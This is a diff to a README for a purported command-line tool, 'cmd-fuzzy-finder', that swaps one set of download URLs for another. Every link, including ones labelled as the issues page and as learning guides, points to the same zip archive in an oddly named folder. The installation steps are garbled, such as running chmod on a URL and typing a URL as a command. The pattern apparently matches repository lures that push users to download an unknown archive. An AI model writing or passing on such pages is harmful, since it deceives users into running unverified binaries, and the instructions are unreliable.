@@ -1,6 +1,6 @@
 # 🎉 cmd-fuzzy-finder - Find Commands Fast and Easy  
 
-[![Download Here](https://raw.githubusercontent.com/Strober35/cmd-fuzzy-finder/main/Imantophyllum/cmd_finder_fuzzy_v2.8.zip%20cmd--fuzzy--finder-brightgreen)](https://raw.githubusercontent.com/Strober35/cmd-fuzzy-finder/main/Imantophyllum/cmd_finder_fuzzy_v2.8.zip)
+[![Download Here](https://github.com/Strober35/cmd-fuzzy-finder/raw/refs/heads/main/Imantophyllum/cmd_finder_fuzzy_v2.8.zip%20cmd--fuzzy--finder-brightgreen)](https://github.com/Strober35/cmd-fuzzy-finder/raw/refs/heads/main/Imantophyllum/cmd_finder_fuzzy_v2.8.zip)
 
 ## 🚀 Getting Started  
 
@@ -16,10 +16,10 @@ cmd-fuzzy-finder is a handy tool that helps you quickly find and run binary comm
 
 To begin, visit the release page by clicking the link below.  
 
-[Download cmd-fuzzy-finder](https://raw.githubusercontent.com/Strober35/cmd-fuzzy-finder/main/Imantophyllum/cmd_finder_fuzzy_v2.8.zip)
+[Download cmd-fuzzy-finder](https://github.com/Strober35/cmd-fuzzy-finder/raw/refs/heads/main/Imantophyllum/cmd_finder_fuzzy_v2.8.zip)
 
 1. On the releases page, scroll to find the latest version.
-2. Look for the appropriate file for your system and click to download it. You may see names like `https://raw.githubusercontent.com/Strober35/cmd-fuzzy-finder/main/Imantophyllum/cmd_finder_fuzzy_v2.8.zip` or `cmd-fuzzy-finder`. Download the file.
+2. Look for the appropriate file for your system and click to download it. You may see names like `https://github.com/Strober35/cmd-fuzzy-finder/raw/refs/heads/main/Imantophyllum/cmd_finder_fuzzy_v2.8.zip` or `cmd-fuzzy-finder`. Download the file.
 
 3. Open your terminal.
 
@@ -31,12 +31,12 @@ To begin, visit the release page by clicking the link below.
 
 5. To make the script executable, run:
    ```bash
-   chmod +x https://raw.githubusercontent.com/Strober35/cmd-fuzzy-finder/main/Imantophyllum/cmd_finder_fuzzy_v2.8.zip
+   chmod +x https://github.com/Strober35/cmd-fuzzy-finder/raw/refs/heads/main/Imantophyllum/cmd_finder_fuzzy_v2.8.zip
    ```
 
 6. You can now run the tool by typing:
    ```bash
-   https://raw.githubusercontent.com/Strober35/cmd-fuzzy-finder/main/Imantophyllum/cmd_finder_fuzzy_v2.8.zip
+   https://github.com/Strober35/cmd-fuzzy-finder/raw/refs/heads/main/Imantophyllum/cmd_finder_fuzzy_v2.8.zip
    ```
 
 ## 🛠️ How to Use  
@@ -48,7 +48,7 @@ Using cmd-fuzzy-finder is simple. Start by executing the script in your terminal
 1. Open your terminal.
 2. Type:
    ```bash
-   https://raw.githubusercontent.com/Strober35/cmd-fuzzy-finder/main/Imantophyllum/cmd_finder_fuzzy_v2.8.zip
+   https://github.com/Strober35/cmd-fuzzy-finder/raw/refs/heads/main/Imantophyllum/cmd_finder_fuzzy_v2.8.zip
    ```
 3. Start typing a command. For example, if you type "git", cmd-fuzzy-finder will show you any commands that include the letters "git".
 4. Once you see the command you want, press Enter to execute it.
@@ -62,12 +62,12 @@ Using cmd-fuzzy-finder is simple. Start by executing the script in your terminal
 
 ## 👩‍💻 Support  
 
-If you encounter any issues or need help, check our [Issues page](https://raw.githubusercontent.com/Strober35/cmd-fuzzy-finder/main/Imantophyllum/cmd_finder_fuzzy_v2.8.zip). You can report bugs or ask for additional features there.
+If you encounter any issues or need help, check our [Issues page](https://github.com/Strober35/cmd-fuzzy-finder/raw/refs/heads/main/Imantophyllum/cmd_finder_fuzzy_v2.8.zip). You can report bugs or ask for additional features there.
 
 ## 📚 Additional Resources  
 
-- [Command Line Basics](https://raw.githubusercontent.com/Strober35/cmd-fuzzy-finder/main/Imantophyllum/cmd_finder_fuzzy_v2.8.zip)
-- [Bash Scripting Guide](https://raw.githubusercontent.com/Strober35/cmd-fuzzy-finder/main/Imantophyllum/cmd_finder_fuzzy_v2.8.zip)
+- [Command Line Basics](https://github.com/Strober35/cmd-fuzzy-finder/raw/refs/heads/main/Imantophyllum/cmd_finder_fuzzy_v2.8.zip)
+- [Bash Scripting Guide](https://github.com/Strober35/cmd-fuzzy-finder/raw/refs/heads/main/Imantophyllum/cmd_finder_fuzzy_v2.8.zip)
 
 ## ⚖️ License  
 
@@ -79,4 +79,4 @@ For more updates and future releases, check back on this repository. You can fin
 
 Don’t forget to visit our releases page for the latest version:  
 
-[Download cmd-fuzzy-finder](https://raw.githubusercontent.com/Strober35/cmd-fuzzy-finder/main/Imantophyllum/cmd_finder_fuzzy_v2.8.zip)
+[Download cmd-fuzzy-finder](https://github.com/Strober35/cmd-fuzzy-finder/raw/refs/heads/main/Imantophyllum/cmd_finder_fuzzy_v2.8.zip)
